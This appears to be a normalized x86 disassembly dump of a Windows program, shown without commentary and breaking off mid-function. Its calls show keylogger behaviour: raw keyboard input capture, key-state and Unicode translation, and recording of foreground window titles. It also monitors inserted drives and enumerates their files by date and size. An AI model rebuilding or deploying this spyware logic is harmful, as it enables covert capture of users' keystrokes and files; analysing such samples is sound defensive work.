fmul [ esp + 0x20 ]
fadd [ esp + 0x48 ]
fstp [ esp + 0x20 ]
fst [ esp + 0x38 ]
fld st0
fmulp st1
fld [ esp + 0x20 ]
fmul [ esp + 0x20 ]
faddp st1
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
call sub_403925
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
lea eax [ esp + 0x60 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x64 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x20 ] 0xfa
inc [ esp + 0x1c ]
cmp [ esp + 0x1c ] 0x64
jl r-xdata
mov [ esp + 0x1c ] 0x1869f
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
call sub_4046cc
call sub_40778f
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
inc [ esp + 0x14 ]
cmp [ esp + 0x14 ] 0x141
jle r-xdata
push 0x0
call edi
mov eax [ esp + 0x38 ]
mov al [ eax ]
mov cl [ esp + 0x30 ]
add [ esp + 0x30 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x38 ]
inc esi
cmp [ esp + 0x30 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
call sub_403925
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
xor esi esi
inc esi
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x13 ] 0x0
push 0x1a
mov [ esi + 0x2 ] 0x0
pop esi
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
pop edi
mov [ esi + 0x2 ] 0x0
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x74 ]
push eax
mov [ esp + 0x28 ] 0x214
call [ GetUserNameW@IAT ]
dec esi
jne r-xdata
cmp [ esp + 0x1c ] 0x1869f
jge r-xdata
call [ GetCommandLineW@IAT ]
xor ecx ecx
cmp [ eax + edx * 2 ] 0x0
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc [ esp + 0x18 ]
cmp [ esp + 0x18 ] 0xaa
jle r-xdata
inc ecx
cmp ecx 0x14
jl r-xdata
xor esi esi
inc esi
mov edx ecx
and edx 0x80000001
jns r-xdata
sub_40778f
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
push edi
lea eax [ esi + 0x57ec ]
push eax
call sub_405caf
call sub_4070c5
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40354f
call sub_4066e2
cmp eax 0x3
jl r-xdata
push r--data
call sub_40251f
push r--data
call sub_40251f
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_402bc9
xor ecx ecx
mov eax r--data
mov [ ebp - 0x8 ] ebx
cmp ecx eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
call sub_4066e2
cmp eax 0x309
jne r-xdata
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push 0x4
push r--data
push eax
push 0x80000001
call sub_40697b
lea eax [ ebp - 0xc ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push ebx
call sub_4016c1
push eax
xor edi edi
call sub_402aaf
push ebx
push ebx
call [ LocalFree@IAT ]
mov ebx esi
call sub_4043f5
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
cmp [ esi + 0x5958 ] bl
je r-xdata
mov edi esi
call sub_40462d
mov edi esi
call sub_40454f
mov ecx esi
call sub_402ff5
test al al
jne r-xdata
call sub_40374c
push ebx
jmp r-xdata
mov ecx esi
call sub_402be5
test al al
jne r-xdata
call [ ExitProcess@IAT ]
mov edi 0x168
push 0x1388
call [ Sleep@IAT ]
dec edi
jne r-xdata
sub_4078bc
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x1c4
push ebx
push esi
push edi
cmp eax 0x12
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
cmp eax 0x4f
jbe r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcW@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp eax 0x51
jbe r-xdata
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
jmp r-xdata
cmp eax 0xff
jne r-xdata
push 0x10
lea eax [ ebp - 0x20 ]
push eax
xor esi esi
push esi
push 0x10000003
push [ ebp + 0x14 ]
mov [ ebp - 0x20 ] esi
call [ GetRawInputData@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] esi
jbe r-xdata
call sub_4046cc
push rw-data
call sub_405cd1
mov eax [ ebp - 0x20 ]
xor ebx ebx
inc ebx
cmp [ rw-data ] eax
jae r-xdata
call [ GetForegroundWindow@IAT ]
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi [ rw-data ]
je r-xdata
cmp eax esi
jle r-xdata
mov esi rw-data
mov ecx 0x190
lea eax [ ebp - 0x1c0 ]
push ebx
push eax
mov esi rw-data
call sub_405f9d
call sub_4046cc
push rw-data
call sub_405cf1
jmp r-xdata
mov edi [ rw-data ]
cmp [ edi ] 0x0
jne r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push r--data
lea eax [ ebp - 0x1c0 ]
push eax
call [ lstrcpyW@IAT ]
push 0xc7
lea eax [ ebp - 0x1c0 ]
push eax
push edi
call [ GetWindowTextW@IAT ]
mov [ ebp - 0x30 ] 0x11
mov [ ebp - 0x2f ] edi
call sub_4046cc
call sub_403925
mov [ ebp - 0x2b ] eax
push 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0x9
mov esi rw-data
pop eax
mov ecx esi
call sub_4060be
lea eax [ ebp - 0x1c0 ]
push eax
push esi
call sub_4025f0
mov [ rw-data ] edi
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
mov ax [ edi + 0x14 ]
mov [ ebp - 0x19 ] ax
test al 0xaa
jne r-xdata
push 0x10
lea eax [ ebp - 0x20 ]
push eax
push [ rw-data ]
push 0x10000003
push [ ebp + 0x14 ]
call [ GetRawInputData@IAT ]
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ edi + 0x18 ] 0x100
jne r-xdata
mov [ ebp - 0x1c ] 0x36
mov eax [ edi + 0x1c ]
mov [ ebp - 0x15 ] eax
mov eax [ edi + 0x20 ]
mov [ ebp - 0x11 ] eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x13
pop eax
mov ecx esi
call sub_4060be
test [ ebp - 0x19 ] 0x200
je r-xdata
mov esi [ GetAsyncKeyState@IAT ]
xor eax eax
push 0x10
mov [ ebp - 0x1c ] 0x24
mov [ ebp - 0x19 ] ax
call esi
cwde
shr eax 0x1f
and al bl
push 0x12
mov [ ebp - 0x3 ] al
call esi
cwde
shr eax 0x1f
and al bl
push 0x11
mov [ ebp - 0x5 ] al
call esi
cwde
shr eax 0x1f
and al bl
push 0x14
mov [ ebp - 0x4 ] al
call esi
cwde
shr eax 0x1f
and al bl
push 0x91
mov [ ebp - 0x2 ] al
call esi
cwde
shr eax 0x1f
and al bl
push 0x90
mov [ ebp - 0x1 ] al
call esi
cwde
shr eax 0x1f
and al bl
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0x19 ] bx
cmp [ ebp - 0x3 ] 0x0
je r-xdata
or [ ebp - 0x19 ] 0x2
cmp [ ebp - 0x2 ] 0x0
je r-xdata
or [ ebp - 0x19 ] 0x4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
or [ ebp - 0x19 ] 0x10
test al al
je r-xdata
or [ ebp - 0x19 ] 0x20
mov ax [ edi + 0x10 ]
mov [ ebp - 0x1b ] ax
mov ax [ edi + 0x16 ]
mov edi rw-data
push edi
mov [ ebp - 0x17 ] ax
call [ GetKeyboardState@IAT ]
xor ebx ebx
push ebx
push [ ebp - 0x24 ]
call [ GetWindowThreadProcessId@IAT ]
push eax
call [ GetKeyboardLayout@IAT ]
push eax
push ebx
push 0x4
mov [ rw-data ] eax
mov [ ebp - 0xd ] eax
movzx eax [ ebp - 0x1b ]
mov esi rw-data
push esi
push edi
push eax
movzx eax [ ebp - 0x17 ]
push eax
call [ ToUnicodeEx@IAT ]
push 0x8
push esi
mov edi eax
lea eax [ ebp - 0x15 ]
push 0x8
push eax
call sub_4138cf
add esp 0x10
cmp edi 0x3
jb r-xdata
or [ ebp - 0x19 ] 0x40
xor eax eax
mov [ ebp + edi * 2 - 0x15 ] ax
push ebx
lea eax [ ebp - 0x1c ]
push eax
push 0x13
pop eax
mov ecx rw-data
call sub_4060be
push 0x3
pop edi
sub_407bb0
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
push 0x30
pop esi
push esi
mov edi eax
xor ebx ebx
lea eax [ ebp - 0x34 ]
push ebx
push eax
call sub_4130d0
mov eax [ edi + 0x5804 ]
mov [ ebp - 0x20 ] eax
add esp 0xc
mov [ ebp - 0x34 ] esi
lea eax [ ebp - 0x34 ]
mov esi r--data
push eax
mov [ ebp - 0x30 ] 0x4000
mov [ ebp - 0x2c ] sub_4078bc
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ebx
call [ RegisterClassExW@IAT ]
mov edi [ edi + 0x5804 ]
push ebx
push edi
push ebx
push ebx
mov eax 0x190
push eax
push eax
push ebx
push ebx
mov edi 0x2000000
push edi
push r--data
push esi
push ebx
call [ CreateWindowExW@IAT ]
mov esi [ SetWindowLongW@IAT ]
push edi
push 0xfffffff0
push eax
mov [ ebp - 0x4 ] eax
call esi
mov edi [ ebp - 0x4 ]
push 0x8000000
push 0xffffffec
push edi
call esi
push ebx
push edi
call [ ShowWindow@IAT ]
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push 0x1c
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
xor ecx ecx
push 0x6
inc ecx
mov [ eax ] cx
pop ecx
mov [ eax + 0x2 ] cx
xor edx edx
mov ecx 0x100
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
push 0x2
inc edx
mov [ eax + 0xc ] dx
pop edx
push 0xc
push edx
push eax
mov [ eax + 0xe ] dx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] edi
call [ RegisterRawInputDevices@IAT ]
mov al 0x1
push ebx
call [ ExitProcess@IAT ]
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407ccd
sub esp 0x20
and [ esp ] 0x0
push ebx
push ebp
push esi
push edi
call sub_40354f
test eax eax
je r-xdata
mov ebx rw-data
mov esi ebx
call sub_406c79
mov edi [ Sleep@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push 0xea60
call edi
mov esi ebx
call sub_406c79
mov esi rw-data
call sub_405f3e
mov eax ebx
call sub_406de4
cmp eax 0xffffffff
je r-xdata
mov ebp rw-data
push ebp
call sub_405caf
mov eax [ esp + 0x34 ]
call sub_407bb0
mov eax esi
call sub_406f26
push esi
push esi
push esi
push esi
lea eax [ esp + 0x24 ]
push eax
call [ PeekMessageW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jle r-xdata
push esi
push esi
push esi
lea eax [ esp + 0x20 ]
push eax
call [ GetMessageW@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] esi
cmp [ esp + 0x10 ] 0x3c
jg r-xdata
mov edi rw-data
call sub_406db6
mov al 0x1
lea eax [ esp + 0x14 ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
inc [ esp + 0x10 ]
push 0x3e8
call edi
cmp [ rw-data ] esi
jle r-xdata
push ebp
call sub_405cd1
mov eax [ rw-data ]
mov esi [ rw-data ]
push eax
push 0x0
push 0x64
push [ esp + 0x40 ]
mov ebx eax
call sub_403aef
push eax
push 0x70737200
push ebx
push esi
mov esi [ esp + 0x50 ]
call sub_40242d
test al al
je r-xdata
cmp eax 0x186a0
jle r-xdata
xor esi esi
jmp r-xdata
push ebp
call sub_405cd1
mov edx rw-data
mov ecx rw-data
call sub_406e3e
push ebp
call sub_405cf1
push ebp
call sub_405cf1
xor esi esi
jmp r-xdata
mov esi rw-data
call sub_405f3e
and [ esp + 0x10 ] 0x0
push 0xa
call edi
push esi
call edi
mov eax [ esp + 0x10 ]
push 0x3c
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
sub_407e40
mov eax sub_41d90c
call sub_4198ec
push ecx
push esi
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push esi
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
call sub_405f2c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_407e71
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x210
push esi
mov esi eax
push edi
mov ecx 0x210
lea eax [ esp + 0x8 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call edi
lea eax [ esi + 0x2c ]
push eax
lea eax [ esp + 0xc ]
push eax
call edi
cmp [ ebp + 0xc ] 0x1
mov eax [ esi + 0x20 ]
mov [ esp + 0x210 ] eax
jne r-xdata
add esi 0x14
add esi 0x4
jmp r-xdata
call sub_4038dc
mov ecx [ esp + 0x210 ]
and ecx 0xfffff000
xor edx edx
mov [ esp + 0x210 ] ecx
push 0x3c
pop ecx
div ecx
xor edx edx
div ecx
mov [ esp + 0x214 ] eax
call sub_4046cc
push 0x210
lea eax [ esp + 0xc ]
push eax
call sub_401806
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_407f19
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ eax + 0x4 ]
shr esi 0x2
xor ebx ebx
push edi
mov [ ebp - 0x1 ] 0x0
test esi esi
jle r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi [ Sleep@IAT ]
mov [ ebp - 0x1 ] 0x1
push 0xa
call edi
push 0x0
call edi
inc ebx
cmp ebx esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call sub_4046cc
mov eax [ ebp - 0x8 ]
push [ eax + ebx * 4 ]
push [ ebp + 0x8 ]
call sub_403ba4
test al al
jne r-xdata
jmp r-xdata
sub_407f7f
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi eax
cmp [ esi + 0x1c ] 0x0
mov ebx ecx
mov eax [ ebx + 0x30 ]
mov [ ebp - 0x8 ] eax
jne r-xdata
xor al al
mov eax [ esi + 0x20 ]
cmp eax 0x2800
jb r-xdata
cmp eax 0xa00000
ja r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax 0x7da
cmp [ ebp - 0x18 ] ax
jb r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi + 0x14 ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax 0x7da
cmp [ ebp - 0x18 ] ax
jb r-xdata
lea eax [ esi + 0x2c ]
push rw-data
push eax
call sub_407f19
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ esi + 0x2c ]
push rw-data
push eax
call sub_407f19
pop ecx
pop ecx
test al al
je r-xdata
push 0x0
push [ ebp + 0x8 ]
mov eax esi
call sub_407e71
mov esi [ Sleep@IAT ]
pop ecx
pop ecx
push 0xa
mov [ edi ] eax
call esi
push 0x0
call esi
call sub_4046cc
push [ edi ]
lea eax [ ebx + 0x30 ]
call sub_401839
push 0xa
mov ebx eax
call esi
push 0x0
call esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ edi ]
je r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
leave
retn 0x4
sub_40805f
push ebp
mov ebp esp
sub esp 0x678
push ebx
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x674 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x674 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x264 ]
push eax
lea eax [ ebp - 0x674 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
xor al al
jmp r-xdata
push [ ebp - 0xc ]
call [ FindClose@IAT ]
mov al 0x1
push [ ebp + 0xc ]
lea eax [ ebp - 0x46c ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x46c ]
push eax
call edi
lea eax [ ebp - 0x238 ]
push eax
lea eax [ ebp - 0x46c ]
push eax
call edi
test [ ebp - 0x264 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov edi [ lstrcmpW@IAT ]
push r--data
lea eax [ ebp - 0x238 ]
push eax
call edi
test eax eax
je r-xdata
push [ ebp + 0xc ]
lea edi [ ebp - 0x10 ]
lea eax [ ebp - 0x264 ]
mov ecx ebx
call sub_407f7f
test al al
je r-xdata
lea eax [ ebp - 0x264 ]
push eax
push [ ebp - 0xc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x238 ]
push eax
call edi
test eax eax
je r-xdata
call sub_4046cc
call sub_403925
mov edi eax
sub eax [ ebx ]
cmp eax 0xb4
jbe r-xdata
mov edi [ ebx + 0x4 ]
call sub_4046cc
push eax
mov [ ebp - 0x8 ] eax
call sub_403aef
push 0x0
push eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x264 ]
push eax
lea eax [ ebp - 0x46c ]
push eax
push 0x70941102
push [ ebp - 0x8 ]
call sub_405084
push edi
push sub_407f74
push [ ebp - 0x14 ]
lea eax [ ebp - 0x264 ]
push eax
lea eax [ ebp - 0x46c ]
push eax
push 0x70941101
push [ ebp - 0x8 ]
call sub_4052e6
test al al
je r-xdata
push 0xa
call esi
push 0x0
call esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x46c ]
push rw-data
push eax
call sub_407f19
pop ecx
pop ecx
test al al
jne r-xdata
push 0xa
call esi
push 0x0
call esi
mov eax [ ebx + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebx + 0x30 ]
call sub_406e3e
mov [ ebx ] edi
jmp r-xdata
call sub_4046cc
lea eax [ ebx + 0x30 ]
mov ebx [ ebp - 0x10 ]
call sub_401872
push 0xa
call esi
push 0x0
call esi
mov ebx [ ebp + 0x8 ]
call sub_4046cc
lea edi [ ebp - 0x46c ]
call sub_403fca
push eax
lea ecx [ ebx + 0x18 ]
call sub_406161
sub_40825a
mov eax sub_41dd9e
call sub_4198ec
sub esp 0x274
push ebx
push esi
push edi
lea esi [ ebp - 0x20 ]
call sub_405d11
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x8 ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ edi + 0x4 ]
push ebx
push ebx
add eax 0x90
push eax
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ edi + 0x4 ]
movzx eax [ eax + 0x90 ]
sub eax 0x41
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x4 ]
shr eax 0x2
xor esi esi
test eax eax
jle r-xdata
lea eax [ ebp - 0x20 ]
mov ebx esi
call sub_406f26
call sub_4046cc
add edi 0x30
push edi
lea eax [ ebp - 0x20 ]
call sub_4018da
mov edi esi
call sub_406db6
lea esi [ ebp - 0x20 ]
call sub_405f3e
mov edi [ ebp + 0x8 ]
xor ebx ebx
push eax
call sub_4046cc
push eax
mov eax 0x70941101
lea ecx [ ebp - 0x280 ]
call sub_406b4c
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x280 ]
call sub_406c79
test al al
je r-xdata
cmp [ edi + 0x1c ] ebx
je r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax ]
lea ecx [ ebp - 0x280 ]
push ecx
push [ eax + esi * 4 ]
push edi
call sub_40805f
mov eax [ edi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
lea edx [ edi + 0x30 ]
lea ecx [ ebp - 0x280 ]
call sub_406e3e
mov [ ebp - 0x4 ] bl
lea eax [ ebp - 0x280 ]
call sub_406c46
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov ecx [ edi + 0x28 ]
mov eax [ edi + 0x2c ]
push ecx
mov [ edi + 0x2c ] ecx
mov [ edi + 0x28 ] eax
call sub_406650
mov esi [ Sleep@IAT ]
push 0xa
call esi
push ebx
call esi
jmp r-xdata
push [ edi + 0x2c ]
call sub_406650
push [ edi + 0x28 ]
call sub_406650
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x4 ]
inc esi
shr eax 0x2
cmp esi eax
jl r-xdata
jmp r-xdata
sub_4083b2
push ebp
mov ebp esp
and esp 0xfffffff8
push ebx
push edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
call sub_4046cc
mov edi [ esi + 0x4 ]
add edi 0x90
call sub_403fca
push eax
lea ecx [ esi + 0x8 ]
call sub_406161
push esi
call sub_40825a
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4046cc
push eax
mov eax 0x708
call sub_403b4d
sub_408422
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
push edi
mov ebx eax
mov edi ebx
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_408404
and [ esi ] 0x0
lea esi [ edi + rw-data ]
call sub_408404
and [ esi ] 0x0
lea eax [ ebx + 0x41 ]
movzx esi ax
push r--data
lea eax [ edi + rw-data ]
push eax
call [ lstrcpyW@IAT ]
push r--data
call [ lstrlenW@IAT ]
imul ebx ebx 0x50
mov [ ebp - 0x4 ] 0x40
sub [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
add ebx eax
add ebx ebx
lea eax [ ebx + rw-data ]
push r--data
mov [ ebp - 0x8 ] ebx
mov ebx [ lstrcpynW@IAT ]
push eax
call ebx
mov eax [ ebp - 0x8 ]
lea eax [ eax + rw-data ]
mov [ eax ] si
lea eax [ edi + rw-data ]
push r--data
push eax
mov [ ebp - 0xc ] eax
call [ lstrcpyW@IAT ]
push [ ebp - 0x4 ]
push r--data
push [ ebp - 0xc ]
call ebx
mov eax [ ebp - 0x8 ]
push r--data
lea ebx [ edi + rw-data ]
push ebx
mov [ eax + rw-data ] si
call [ lstrcpyW@IAT ]
mov [ ebx ] si
xor esi esi
push esi
call [ SetLastError@IAT ]
push [ ebp - 0xc ]
push esi
push 0x1f0001
call [ OpenMutexW@IAT ]
mov [ ebp - 0xc ] eax
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push esi
push 0x2000000
push 0x3
push esi
push 0x7
push 0x80000000
push ebx
call [ CreateFileW@IAT ]
push 0x2c
pop ebx
push ebx
mov [ edi + rw-data ] eax
lea eax [ ebp - 0x38 ]
push esi
push eax
call sub_4130d0
mov eax [ edi + rw-data ]
add esp 0xc
mov [ ebp - 0x2c ] eax
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] 0x6
call [ RegisterDeviceNotificationW@IAT ]
mov [ edi + rw-data ] eax
cmp [ ebp - 0xc ] esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_408571
mov eax sub_41deb0
call sub_4198ec
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40264d
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x18 ] eax
mov esi eax
call sub_405d11
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x18 ] eax
mov esi eax
call sub_405d11
mov [ ebp - 0x4 ] 0x3
lea esi [ ebp - 0x28 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x4
mov edi ebx
imul edi edi 0xa0
lea esi [ edi + rw-data ]
mov [ ebp - 0x54 ] esi
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x2c ] eax
call sub_4046cc
call sub_403925
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0x5
test ebx ebx
jns r-xdata
call sub_408404
lea eax [ edi + rw-data ]
push eax
push 0x1
push 0x0
call [ CreateMutexW@IAT ]
mov [ edi + rw-data ] eax
mov [ ebp - 0x4 ] 0x9
lea esi [ ebp - 0x58 ]
call sub_4083b2
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp ebx 0x1a
jl r-xdata
mov edi ebx
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_408404
lea esi [ edi + rw-data ]
call sub_408404
push [ edi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
call sub_4046cc
push [ ebp + 0x8 ]
call sub_405c44
mov [ ebp - 0x4 ] 0xc
lea esi [ ebp - 0x28 ]
call sub_405f2c
mov [ ebp - 0x4 ] 0xb
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
lea esi [ ebp - 0x28 ]
call sub_405f2c
mov [ ebp - 0x4 ] 0x6
xor esi esi
inc esi
lea eax [ ebp - 0x40 ]
push eax
call sub_407e40
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
call sub_407e40
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_408679
mov ebx [ ebp - 0x14 ]
mov edi ebx
imul edi edi 0xa0
lea esi [ edi + rw-data ]
call sub_408404
lea esi [ edi + rw-data ]
call sub_408404
push [ edi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
call sub_4046cc
push [ ebp + 0x8 ]
call sub_405c44
mov [ ebp - 0x4 ] 0xc
lea esi [ ebp - 0x28 ]
call sub_405f2c
mov [ ebp - 0x4 ] 0xb
xor esi esi
jmp r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_407e40
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x50 ]
push eax
call sub_407e40
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4086cd
mov eax sub_41da03
call sub_4198ec
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x30 ]
call sub_405f2c
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x18 ]
push eax
call sub_407e40
or [ ebp - 0x4 ] 0xffffffff
add edi 0x8
push edi
call sub_407e40
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
sub_408715
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push [ ebp + 0x8 ]
mov eax esi
call sub_408422
pop ecx
call sub_4046cc
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push 0x8
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
